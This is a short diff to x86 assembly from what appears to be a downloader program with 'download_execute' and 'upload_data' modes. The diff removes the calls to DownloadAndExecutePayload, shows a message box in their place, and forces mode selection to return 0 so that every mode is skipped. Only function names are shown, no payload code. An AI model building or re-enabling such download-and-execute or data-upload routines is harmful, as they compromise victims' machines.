@@ -297,9 +297,13 @@ _start:
     jmp exit_program
 
 mode_download_execute:
-    call ConfigureDownloadURL
-    call DownloadAndExecutePayload
-    jmp operation_complete
+    ; Show a message instead of actually downloading
+    push MB_ICONINFORMATION
+    push msg_title
+    push msg_operation_complete
+    push 0
+    call _MessageBoxA@16
+    jmp exit_program
 
 mode_upload_data:
     call ConfigureUploadURL
@@ -396,7 +400,8 @@ GetUserChoice:
     push ebp
     mov ebp, esp
     
-    mov eax, 1
+    ; Return 0 to skip all modes and just exit
+    mov eax, 0
     
     pop ebp
     ret
